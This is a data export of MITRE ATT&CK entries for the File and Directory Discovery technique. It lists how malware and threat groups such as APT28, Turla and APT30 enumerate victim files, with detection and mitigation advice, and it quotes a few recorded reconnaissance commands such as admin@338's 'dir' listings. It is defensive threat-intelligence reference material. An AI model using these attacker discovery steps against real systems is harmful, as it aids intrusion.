137,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Collection]] and [[Exfiltration]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0045|ADVSTORESHELL]] can list files and directories.[[CiteRef::ESET Sednit Part 2]][[CiteRef::Bitdefender APT28 Dec 2015]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['File system activity is a common part of an operating system, so it is unlikely that mitigation would be appropriate for this technique. It may still be beneficial to identify and block unnecessary system utilities or potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls']","Software: ADVSTORESHELL, NETUI, ...",['Discovery'],['Technique/T1083'],['File and Directory Discovery'],https://attack.mitre.org/wiki/Technique/T1083
138,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Collection]] and [[Exfiltration]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']","[u'[[Software/S0136|USBStealer]] searches victim drives for files matching certain extensions (\u201c.skr\u201d,\u201c.pkr\u201d or \u201c.key\u201d) or names.[[CiteRef::ESET Sednit USBStealer 2014]][[CiteRef::Kaspersky Sofacy]]']",['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['File system activity is a common part of an operating system, so it is unlikely that mitigation would be appropriate for this technique. It may still be beneficial to identify and block unnecessary system utilities or potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls']","Software: USBStealer, USB Stealer, Win32/USBStealer",['Discovery'],['Technique/T1083'],['File and Directory Discovery'],https://attack.mitre.org/wiki/Technique/T1083
139,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Collection]] and [[Exfiltration]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0161|XAgentOSX]] contains the readFiles function to return a detailed listing (sometimes recursive) of a specified directory.[[CiteRef::XAgentOSX]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['File system activity is a common part of an operating system, so it is unlikely that mitigation would be appropriate for this technique. It may still be beneficial to identify and block unnecessary system utilities or potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls']",Software: XAgentOSX,['Discovery'],['Technique/T1083'],['File and Directory Discovery'],https://attack.mitre.org/wiki/Technique/T1083
140,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Collection]] and [[Exfiltration]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Group/G0007|APT28]] has a utility to list detailed information about files and directories [[CiteRef::XAgentOSX]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['File system activity is a common part of an operating system, so it is unlikely that mitigation would be appropriate for this technique. It may still be beneficial to identify and block unnecessary system utilities or potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls']",[],['Discovery'],['Technique/T1083'],['File and Directory Discovery'],https://attack.mitre.org/wiki/Technique/T1083
141,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Collection]] and [[Exfiltration]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0148|RTM]] can scan victim drives to look for specific banking software on the machine to determine next actions. It also looks at browsing history and open tabs for specific strings.[[CiteRef::ESET RTM Feb 2017]]'],['RTM'],['RTM'],['G0048'],"['File system activity is a common part of an operating system, so it is unlikely that mitigation would be appropriate for this technique. It may still be beneficial to identify and block unnecessary system utilities or potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls']",Software: RTM,['Discovery'],['Technique/T1083'],['File and Directory Discovery'],https://attack.mitre.org/wiki/Technique/T1083
142,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Collection]] and [[Exfiltration]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0078|Psylo]] has commands to enumerate all storage devices and to find all files that start with a particular string.[[CiteRef::Scarlet Mimic Jan 2016]]'],['Scarlet Mimic'],['Scarlet Mimic'],['G0029'],"['File system activity is a common part of an operating system, so it is unlikely that mitigation would be appropriate for this technique. It may still be beneficial to identify and block unnecessary system utilities or potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls']",Software: Psylo,['Discovery'],['Technique/T1083'],['File and Directory Discovery'],https://attack.mitre.org/wiki/Technique/T1083
143,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Collection]] and [[Exfiltration]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']","['[[Software/S0079|MobileOrder]] has a command to upload to its C2 server information about files on the victim mobile device, including SD card size, installed app list, browser bookmarks, SMS content, contacts, and calling history.[[CiteRef::Scarlet Mimic Jan 2016]]']",['Scarlet Mimic'],['Scarlet Mimic'],['G0029'],"['File system activity is a common part of an operating system, so it is unlikely that mitigation would be appropriate for this technique. It may still be beneficial to identify and block unnecessary system utilities or potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls']",Software: MobileOrder,['Discovery'],['Technique/T1083'],['File and Directory Discovery'],https://attack.mitre.org/wiki/Technique/T1083
144,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Collection]] and [[Exfiltration]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']","[""[[Group/G0010|Turla]] surveys a system upon check-in to discover files in specific locations on the hard disk %TEMP% directory, the current user's desktop, and in the Program Files directory.[[CiteRef::Kaspersky Turla]]""]",['Turla'],"['Turla', 'Waterbug']",['G0010'],"['File system activity is a common part of an operating system, so it is unlikely that mitigation would be appropriate for this technique. It may still be beneficial to identify and block unnecessary system utilities or potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls']",[],['Discovery'],['Technique/T1083'],['File and Directory Discovery'],https://attack.mitre.org/wiki/Technique/T1083
145,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Collection]] and [[Exfiltration]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['A variant of [[Software/S0081|Elise]] executes <code>dir C:\\progra~1</code> when initially run.[[CiteRef::Lotus Blossom Jun 2015]]'],['Lotus Blossom'],"['Lotus Blossom', 'Spring Dragon']",['G0030'],"['File system activity is a common part of an operating system, so it is unlikely that mitigation would be appropriate for this technique. It may still be beneficial to identify and block unnecessary system utilities or potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls']","Software: Elise, BKDR_ESILE, Page",['Discovery'],['Technique/T1083'],['File and Directory Discovery'],https://attack.mitre.org/wiki/Technique/T1083
146,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Collection]] and [[Exfiltration]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']","['[[Software/S0089|BlackEnergy]] gathers a list of installed apps from the uninstall program Registry. It also gathers registered mail, browser, and instant messaging clients from the Registry.[[CiteRef::F-Secure BlackEnergy 2014]] [[Software/S0089|BlackEnergy]] has searched for given file types.[[CiteRef::Securelist BlackEnergy Nov 2014]]']",['Sandworm Team'],"['Sandworm Team', 'Quedagh']",['G0034'],"['File system activity is a common part of an operating system, so it is unlikely that mitigation would be appropriate for this technique. It may still be beneficial to identify and block unnecessary system utilities or potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls']","Software: BlackEnergy, Black Energy",['Discovery'],['Technique/T1083'],['File and Directory Discovery'],https://attack.mitre.org/wiki/Technique/T1083
147,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Collection]] and [[Exfiltration]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0031|BACKSPACE]] allows adversaries to search for files.[[CiteRef::FireEye APT30]]'],['APT30'],['APT30'],['G0013'],"['File system activity is a common part of an operating system, so it is unlikely that mitigation would be appropriate for this technique. It may still be beneficial to identify and block unnecessary system utilities or potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls']","Software: BACKSPACE, Lecna",['Discovery'],['Technique/T1083'],['File and Directory Discovery'],https://attack.mitre.org/wiki/Technique/T1083
148,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Collection]] and [[Exfiltration]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']","[""[[Software/S0034|NETEAGLE]] allows adversaries to enumerate and modify the infected host's file system. It supports searching for directories, creating directories, listing directory contents, reading and writing to files, retrieving file attributes, and retrieving volume information.[[CiteRef::FireEye APT30]]""]",['APT30'],['APT30'],['G0013'],"['File system activity is a common part of an operating system, so it is unlikely that mitigation would be appropriate for this technique. It may still be beneficial to identify and block unnecessary system utilities or potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls']",Software: NETEAGLE,['Discovery'],['Technique/T1083'],['File and Directory Discovery'],https://attack.mitre.org/wiki/Technique/T1083
149,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Collection]] and [[Exfiltration]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0035|SPACESHIP]] identifies files and directories for collection by searching for specific file extensions or file modification time.[[CiteRef::FireEye APT30]]'],['APT30'],['APT30'],['G0013'],"['File system activity is a common part of an operating system, so it is unlikely that mitigation would be appropriate for this technique. It may still be beneficial to identify and block unnecessary system utilities or potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls']",Software: SPACESHIP,['Discovery'],['Technique/T1083'],['File and Directory Discovery'],https://attack.mitre.org/wiki/Technique/T1083
150,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Collection]] and [[Exfiltration]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0036|FLASHFLOOD]] searches for interesting files (either a default or customized set of file extensions) on the local system and removable media.[[CiteRef::FireEye APT30]]'],['APT30'],['APT30'],['G0013'],"['File system activity is a common part of an operating system, so it is unlikely that mitigation would be appropriate for this technique. It may still be beneficial to identify and block unnecessary system utilities or potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls']",Software: FLASHFLOOD,['Discovery'],['Technique/T1083'],['File and Directory Discovery'],https://attack.mitre.org/wiki/Technique/T1083
151,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Collection]] and [[Exfiltration]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0055|RARSTONE]] obtains installer properties from Uninstall Registry Key entries to obtain information about installed applications and how to uninstall certain applications.[[CiteRef::Camba RARSTONE]]'],['Naikon'],['Naikon'],['G0019'],"['File system activity is a common part of an operating system, so it is unlikely that mitigation would be appropriate for this technique. It may still be beneficial to identify and block unnecessary system utilities or potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls']",Software: RARSTONE,['Discovery'],['Technique/T1083'],['File and Directory Discovery'],https://attack.mitre.org/wiki/Technique/T1083
152,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Collection]] and [[Exfiltration]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0059|WinMM]] sets a WH_CBT Windows hook to search for and capture files on the victim.[[CiteRef::Baumgartner Naikon 2015]]'],['Naikon'],['Naikon'],['G0019'],"['File system activity is a common part of an operating system, so it is unlikely that mitigation would be appropriate for this technique. It may still be beneficial to identify and block unnecessary system utilities or potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls']",Software: WinMM,['Discovery'],['Technique/T1083'],['File and Directory Discovery'],https://attack.mitre.org/wiki/Technique/T1083
153,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Collection]] and [[Exfiltration]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']","['[[Group/G0018|admin@338]] actors used the following commands after exploiting a machine with [[Software/S0042|LOWBALL]] malware to obtain information about files and directories:\n** <code>dir c:\\ >> %temp%\\download</code>\n** <code>dir ""c:\\Documents and Settings"" >> %temp%\\download</code>\n** <code>dir ""c:\\Program Files\\"" >> %temp%\\download</code>\n** <code>dir d:\\ >> %temp%\\download</code>[[CiteRef::FireEye admin@338]]']",['admin@338'],['admin@338'],['G0018'],"['File system activity is a common part of an operating system, so it is unlikely that mitigation would be appropriate for this technique. It may still be beneficial to identify and block unnecessary system utilities or potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls']",[],['Discovery'],['Technique/T1083'],['File and Directory Discovery'],https://attack.mitre.org/wiki/Technique/T1083
154,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Collection]] and [[Exfiltration]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0157|SOUNDBITE]] is capable of enumerating and manipulating files and directories.[[CiteRef::FireEye APT32 May 2017]]'],['APT32'],"['APT32', 'OceanLotus Group']",['G0050'],"['File system activity is a common part of an operating system, so it is unlikely that mitigation would be appropriate for this technique. It may still be beneficial to identify and block unnecessary system utilities or potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows 